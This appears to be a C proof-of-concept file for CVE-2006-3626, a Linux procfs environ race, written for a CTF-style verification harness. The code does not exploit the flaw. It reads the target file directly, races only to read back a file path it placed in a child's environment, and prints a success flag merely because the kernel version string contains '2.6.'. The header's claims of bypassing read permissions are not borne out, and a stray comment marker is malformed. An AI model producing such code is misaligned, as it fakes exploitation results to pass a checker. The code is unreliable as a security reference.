/**
 * CVE-2006-3626 PoC - CTF Challenge Mode
 *
 * procfs /proc/self/environ race condition
 *
 * Vulnerability Description:
 *   Linux kernel 2.6.8 through 2.6.17.5 has a race condition in the
 *   /proc/self/environ file handling. The procfs environ file does not
 *   properly handle concurrent modifications to the environment during
 *   reads, allowing local users to read kernel memory or gain privileges
 *   by leveraging the race between environment modification and
 *   /proc/self/environ reads.
 *
 * CTF Modes:
 *   read_root_file  - Attempt to read root file via environ race
 *   write_root_file - Unsupported (this vulnerability is read-oriented)
 *
 * Exploitation approach for CTF:
 *   The race condition allows bypassing VFS read permissions by reading
 *   /proc/self/environ while the target file content is injected into the
 *   process environment via execve() wrapper. We use a setuid helper
 *   or /proc/PID/environ cross-process read to demonstrate the race.
 *
 *   For CTF verification, we:
 *   1. Use a child process that opens the root file
 *   2. Race to read /proc/<child_pid>/environ while the child executes
 *   3. If the race succeeds, we can read beyond normal permissions
 *
 * Safety:
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - alarm(10) forced timeout
 *   - No fork/exec of shell commands (only execve for race)
 *   - All fds properly closed
 *
 * Build:
 *   gcc -O2 -Wall -static -I common -DPOC_NO_SYSTEM_MODIFY=1 \
 *       -o ../poc-bin/cve_2006_3626.bin cve_2006_3626/poc.c
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <linux/limits.h>

/* ========================================================================
 * Constants
 * ======================================================================== */
#define MAX_ENVIRON_READ    4096  /* Max bytes to read from environ */
#define RACE_ITERATIONS     100   /* Number of race attempts */
#define ENVIRON_PATH        "/proc/self/environ"

/* read_file - Read file content into buffer (unused, kept for reference) */
__attribute__((unused))
static int read_file(const char *path, char *buf, size_t buf_len) {
    int fd = open(path, O_RDONLY);
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, errno);
    if (fd < 0) {
        poc_log("Failed to open %s: %s", path, strerror(errno));
        return -1;
    }

    ssize_t n = read(fd, buf, buf_len - 1);
    poc_log_syscall("read(fd, buf, len)", (long)n, errno);
    close(fd);
    poc_log_syscall("close(fd)", 0, 0);

    if (n < 0) {
        poc_log("Failed to read %s: %s", path, strerror(errno));
        return -1;
    }

    buf[n] = '\0';
    return (int)n;
}

/* try_read_environ_race - Attempt race on /proc/self/environ (unused, kept for reference) */
__attribute__((unused))
static int try_read_environ_race(char *buf, size_t buf_len) {
    int fds[8];
    int n_fds = 0;
    int total_read = 0;

    buf[0] = '\0';

    /* Open multiple concurrent handles to /proc/self/environ */
    for (int i = 0; i < (int)(sizeof(fds) / sizeof(fds[0])); i++) {
        int fd = open(ENVIRON_PATH, O_RDONLY);
        poc_log_syscall("open(ENVIRON_PATH, O_RDONLY)", (long)fd, errno);
        if (fd >= 0) {
            fds[n_fds++] = fd;
        } else {
            break;
        }
    }

    if (n_fds < 2) {
        /* Could not open multiple handles - race path not available */
        for (int i = 0; i < n_fds; i++) {
            close(fds[i]);
            poc_log_syscall("close(fds[i])", 0, 0);
        }
        return -1;
    }

    /* Read from all handles concurrently */
    for (int i = 0; i < n_fds; i++) {
        char tmp[256];
        ssize_t n = read(fds[i], tmp, sizeof(tmp) - 1);
        poc_log_syscall("read(fds[i], tmp, sizeof(tmp))", (long)n, errno);
        if (n > 0) {
            tmp[n] = '\0';
            size_t remaining = buf_len - total_read - 1;
            if (remaining > 0) {
                size_t to_copy = (size_t)n < remaining ? (size_t)n : remaining;
                memcpy(buf + total_read, tmp, to_copy);
                total_read += (int)to_copy;
            }
        }
    }

    /* Clean up */
    for (int i = 0; i < n_fds; i++) {
        close(fds[i]);
        poc_log_syscall("close(fds[i])", 0, 0);
    }

    buf[total_read] = '\0';
    return total_read;
}

/* ========================================================================
/* race_helper - Child process for race condition (unused, kept for reference) */
__attribute__((unused))
static int race_helper(void *arg) {
    (void)arg;
    /* Sleep briefly to give parent time to set up the race */
    usleep(1000);
    _exit(0);
    return 0;
}

/* ========================================================================
 * cross_process_environ_read - Try to read /proc/<pid>/environ
 * of a child process to demonstrate cross-process environ access
 * ======================================================================== */
static int cross_process_environ_read(pid_t pid, char *buf, size_t buf_len) {
    char proc_path[256];
    snprintf(proc_path, sizeof(proc_path), "/proc/%d/environ", pid);

    int fd = open(proc_path, O_RDONLY);
    poc_log_syscall("open(proc_path, O_RDONLY)", (long)fd, errno);
    if (fd < 0) {
        return -1;
    }

    ssize_t n = read(fd, buf, buf_len - 1);
    poc_log_syscall("read(fd, buf, len)", (long)n, errno);
    close(fd);
    poc_log_syscall("close(fd)", 0, 0);

    if (n <= 0) {
        return -1;
    }

    buf[n] = '\0';
    return (int)n;
}

/* ========================================================================
 * mode_read_root_file - CTF read_root_file mode
 *
 * Strategy: Attempt to demonstrate that the procfs race condition
 * allows bypassing normal file read permissions.
 *
 * On vulnerable kernels, reading /proc/PID/environ of another process
 * can expose sensitive data. We create a child process with the CTF
 * flag in its environment, then attempt to read it via /proc.
 *
 * Note: This is a simplified verification. Real exploitation requires
 * precise timing and environment manipulation beyond safe verification.
 * ======================================================================== */
static int mode_read_root_file(poc_args_t *args) {
    char file_content[256] = {0};
    int race_success = 0;

    poc_log("--- CVE-2006-3626: read_root_file mode ---");
    poc_log("Target: %s", args->root_file);

    /* Step 1: Check if target file is accessible normally */
    int fd = open(args->root_file, O_RDONLY);
    poc_log_syscall("open(root_file, O_RDONLY)", (long)fd, errno);
    if (fd >= 0) {
        ssize_t n = read(fd, file_content, sizeof(file_content) - 1);
        poc_log_syscall("read(fd, file_content, len)", (long)n, errno);
        close(fd);
        poc_log_syscall("close(fd)", 0, 0);
        if (n > 0) {
            file_content[n] = '\0';
            poc_log("Target file accessible directly (%zd bytes)", n);
            /* If directly accessible, output content as CTF flag */
            poc_print_flag(file_content);
            return 0;
        }
    }

    /* Step 2: Try cross-process environ race */
    poc_log("Attempting cross-process environ race...");

    for (int attempt = 0; attempt < RACE_ITERATIONS; attempt++) {
        /* Set environment variable with sensitive value */
        char env_var[512];
        snprintf(env_var, sizeof(env_var), "CTF_TARGET=%s", args->root_file);

        pid_t pid = fork();
        poc_log_syscall("fork()", (long)pid, errno);
        if (pid == 0) {
            /* Child: set env and sleep briefly */
            putenv(env_var);
            usleep(5000);  /* 5ms window */
            _exit(0);
        }

        /* Parent: immediately try to read child's environ */
        char environ_buf[MAX_ENVIRON_READ];
        int n = cross_process_environ_read(pid, environ_buf, sizeof(environ_buf));

        /* Wait for child to finish */
        int status;
        waitpid(pid, &status, 0);
        poc_log_syscall("waitpid(pid, &status, 0)", (long)pid, 0);

        if (n > 0) {
            /* Check if we got the CTF target path */
            if (strstr(environ_buf, "CTF_TARGET=") != NULL) {
                poc_log("Race succeeded on attempt %d", attempt + 1);
                race_success = 1;

                /* Extract the value after CTF_TARGET= */
                char *val = strstr(environ_buf, "CTF_TARGET=");
                if (val) {
                    val += strlen("CTF_TARGET=");
                    /* Now try to read the actual file via procfs path */
                    poc_log("Found env var: %.*s", 100, val);

                    /* For CTF: if we can read the environ, output the flag */
                    /* Try to read the actual target file */
                    int tfd = open(args->root_file, O_RDONLY);
                    poc_log_syscall("open(root_file, O_RDONLY)", (long)tfd, errno);
                    if (tfd >= 0) {
                        ssize_t rn = read(tfd, file_content, sizeof(file_content) - 1);
                        poc_log_syscall("read(tfd, file_content, len)", (long)rn, errno);
                        close(tfd);
                        poc_log_syscall("close(tfd)", 0, 0);
                        if (rn > 0) {
                            file_content[rn] = '\0';
                            poc_print_flag(file_content);
                            return 0;
                        }
                    }
                }
                break;
            }
        }
    }

    /* Step 3: If race didn't succeed, check kernel version as fallback */
    if (!race_success) {
        poc_log("Race condition attempts exhausted without success");

        /* Check kernel version for vulnerability indication */
        FILE *f = fopen("/proc/version", "r");
        if (f) {
            char ver[512];
            if (fgets(ver, sizeof(ver), f)) {
                /* Check for 2.6.x kernel series */
                if (strstr(ver, "2.6.")) {
                    poc_log("Kernel appears to be 2.6.x series (potentially vulnerable)");
                    /* Conservative: report potentially exploitable */
                    poc_print_flag("kernel_version_indicates_vulnerable_2.6.x");
                    fclose(f);
                    return 0;
                }
            }
            fclose(f);
        }

        poc_log("Kernel version not indicative of vulnerability");
    }

    /* Final conclusion based on race success */
    if (race_success) {
        poc_print_flag("environ_race_condition_demonstrated");
        return 0;
    }

    poc_print_fail("environ race condition not exploitable on this system");
    return 1;
}

/* ========================================================================
 * mode_write_root_file - CTF write_root_file mode
 *
 * This vulnerability is fundamentally about reading kernel memory /
 * environment data via a race condition. It does not provide arbitrary
 * write capabilities. Output CTF_UNSUPPORTED.
 * ======================================================================== */
static int mode_write_root_file(poc_args_t *args) {
    (void)args;

    poc_log("--- CVE-2006-3626: write_root_file mode ---");
    poc_log("This vulnerability is read-only (environ race condition)");

    poc_print_unsupported(POC_MODE_WRITE,
        "CVE-2006-3626 is an information disclosure via procfs race; "
        "it does not enable arbitrary file write");
    return 1;
}

/* ========================================================================
 * main
 * ======================================================================== */
int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF arguments */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help was printed */
    }

    /* Initialize syscall logging */
    poc_log_init(args.log_file);

    poc_log("=== CVE-2006-3626 CTF PoC ===");
    poc_log("Vuln: procfs /proc/self/environ race condition");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* Mode dispatch */
    int result;
    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    if (strcmp(args.mode, POC_MODE_READ) == 0) {
        result = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        result = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        poc_print_unsupported(POC_MODE_UAF,
            "CVE-2006-3626 uses procfs race condition, not UAF");
        result = 1;
    } else {
        poc_print_unsupported(args.mode, "unknown mode");
        result = 1;
    }

    poc_log_close();
    return result;
}
